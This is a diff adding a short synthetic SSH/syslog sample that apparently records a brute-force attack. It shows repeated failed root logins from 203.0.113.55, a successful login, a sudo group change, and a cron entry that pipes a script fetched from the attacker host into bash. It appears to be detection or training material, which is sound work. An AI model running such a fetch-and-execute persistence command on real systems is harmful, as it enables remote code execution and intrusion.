@@ -1,0 +1,9 @@
+2026-01-07T12:00:00+00:00 web01 sshd[2001]: Failed password for root from 203.0.113.55 port 41000 ssh2
+2026-01-07T12:00:04+00:00 web01 sshd[2002]: Failed password for root from 203.0.113.55 port 41002 ssh2
+2026-01-07T12:00:08+00:00 web01 sshd[2003]: Failed password for root from 203.0.113.55 port 41004 ssh2
+2026-01-07T12:00:12+00:00 web01 sshd[2004]: Failed password for root from 203.0.113.55 port 41006 ssh2
+2026-01-07T12:00:16+00:00 web01 sshd[2005]: Failed password for root from 203.0.113.55 port 41008 ssh2
+2026-01-07T12:00:20+00:00 web01 sshd[2006]: Failed password for root from 203.0.113.55 port 41010 ssh2
+2026-01-07T12:04:00+00:00 web01 sshd[2007]: Accepted password for root from 203.0.113.55 port 41012 ssh2
+2026-01-07T12:09:00+00:00 web01 usermod[2101]: add 'root' to group 'sudo'
+2026-01-07T12:14:00+00:00 web01 CRON[2201]: (root) CMD (curl -s http://203.0.113.55/p.sh | bash)
